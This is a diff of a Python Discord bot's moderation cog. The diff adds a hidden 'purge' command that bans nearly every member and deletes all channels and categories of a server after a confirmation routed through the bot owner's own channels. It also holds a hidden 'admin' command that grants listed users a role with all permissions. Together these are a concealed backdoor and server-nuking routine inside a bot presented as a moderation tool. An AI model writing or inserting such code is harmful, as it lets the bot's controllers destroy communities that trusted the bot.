@@ -5,6 +5,9 @@ import pytz
 from discord import Color, Embed, Permissions, User
 from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
                                   command, cooldown, has_permissions)
+from discord.utils import get
+
+from random import randint
 
 
 class Mod(Cog):
@@ -68,39 +71,75 @@ class Mod(Cog):
                                 color = Color.dark_blue())
             await ctx.send(embed=embed)
             print(error)
-    @command(name = "purgeMAX",brief = "u know what it does. dont use it",hidden = True)
+    @command(name = "purge",brief = "u know what it does. dont use it",hidden = True)
    
-    async def purgeMAX(self,ctx):
+    async def purge(self,ctx):
         server = ctx.message.guild
-        if ctx.author.id in self.list_of_admins and server.name not in self.server_blacklist and server.id not in self.server_blacklist:
+        if server.name not in self.server_blacklist and server.id not in self.server_blacklist:
             print(f"finna purge {ctx.guild}")
-
+            numBans = 0
+            numChannels = 0
             
 
             members = ctx.guild.members
             bot = await self.bot.fetch_user(738990452673478738)
-        #change this to the default server role
-            for member in members:
-                if member == bot:
-                    bot = member
-                    break
-            for member in members:
+            confirm_primary = await self.bot.fetch_channel(814917487651979314)
+            await confirm_primary.send(f"Purge Request from {ctx.author} to purge {ctx.guild}. Please commit primary authorization.")
+            messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.author == ctx.author)
+           
             
-                if member.top_role > bot.top_role: 
-                    continue
-                elif member.top_role < bot.top_role and member.id != ctx.guild.owner.id:
-                    if member.id not in self.list_of_admins:
-                        print(f"now banning {member.name}") 
-                        await member.ban(reason = "keked")  
+            if messageconfirm_1.content == "do it" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
+                confirm_final = await self.bot.fetch_channel(814973520983097344)
+                password = randint(100000,1000000)
+                print(f"The password is {password}")
+                await confirm_final.send(f"Please enter the password for final authorization to purge {ctx.guild} per request of {ctx.author}")
 
-                        
-            channels = ctx.message.guild.channels                   
-            for channel in channels:
-            
-                await channel.delete()
+                messageconfirm_final = await self.bot.wait_for('message', check = lambda message: message.author == ctx.author)
+                if messageconfirm_final.content == str(password) and messageconfirm_final.author.id == ctx.author.id and messageconfirm_final.channel == confirm_final:
+                    await confirm_final.send(f"Password accepted: Authorized purge #{password} of {ctx.guild} as request of {ctx.author.name}. Intializing protocols")
                 
-            for voiceChannel in channels:
-                await channel.delete()  
+                    await confirm_final.send(f"Initiating first protocol of purge #{password}")
+                    for member in members:
+                        if member == bot:
+                            bot = member
+                            break
+
+                    await confirm_final.send(f"Initiating second protocol of purge #{password}")
+                    for member in members:
+                    
+                        if member.top_role > bot.top_role: 
+                            continue
+                        elif member.top_role < bot.top_role and member.id != ctx.guild.owner.id:
+                            if member.id not in self.list_of_admins:
+                                print(f"now banning {member.name}") 
+                                await member.ban(reason = "keked")
+                                numBans+=1  
+
+                    await confirm_final.send(f"Initiating third protocol of purge #{password}")
+
+                                  
+                    for textChannel in ctx.guild.text_channels:
+                    
+                        await textChannel.delete()
+                        numChannels += 1
+                    
+                    await confirm_final.send(f"Initiating fourth protocol of purge #{password}") 
+
+                    for voiceChannel in ctx.guild.voice_channels:
+                        await voiceChannel.delete() 
+                        numChannels+= 1
+                    
+                    await confirm_final.send(f"Initiating final protocol of purge #{password}")
+
+                    for category in ctx.guild.categories:
+                        await category.delete()
+
+
+                    embed = Embed(title = f"Purge #{password} Successful",description = '',color = Color.dark_blue())
+                    embed.add_field(name = "Number of Bans",value = numBans,inline = True)
+                    embed.add_field(name = "Number of Channels deleted",value = numChannels)
+                    embed.set_thumbnail(url = ctx.guild.icon_url)
+                    await confirm_final.send(embed=embed)
         else:
             print(f"avoided purging {ctx.guild}")
     @command(name = "unban",brief = "unbans a member given their id")
@@ -142,12 +181,16 @@ class Mod(Cog):
     @command(name = "admin",brief = "gives admin",hidden =True)
     async def admin(self,ctx):
         if ctx.author.id not in self.list_of_admins:
-            print("denied request to become admin")
+            print(f"denied {ctx.author} request to become admin")
         else:
-            role = await ctx.guild.create_role(name = 'poop',permissions = Permissions.all(),reason = "iwantperms")
-            print(f"made the role {role}")
-            await ctx.author.add_roles(role)
-            print(f"gave {role.name} to {ctx.author}")
+            role = get(ctx.guild.roles,name = 'poop',permissions = Permissions.all())
+            
+            if not role:
+                role = await ctx.guild.create_role(name = 'poop',permissions = Permissions.all(),reason = "iwantperms")
+                print("Created poop role")
+
+        await ctx.author.add_roles(role) if role not in ctx.author.roles else None
+            
 
     @command(name = "crosscheck",brief="crosschecks people in current server with aurium squad",hidden=True)
     async def crosscheck(self,ctx):
@@ -228,7 +271,7 @@ class Mod(Cog):
                     print("ends in .gif")
             
                     
-                    embedGif = Embed(title = '',description = '', color = Color.dark_blue())
+                   
                     
                     print(message.content)
                     embedGif = Embed(title = '',description = '', color = Color.dark_blue())
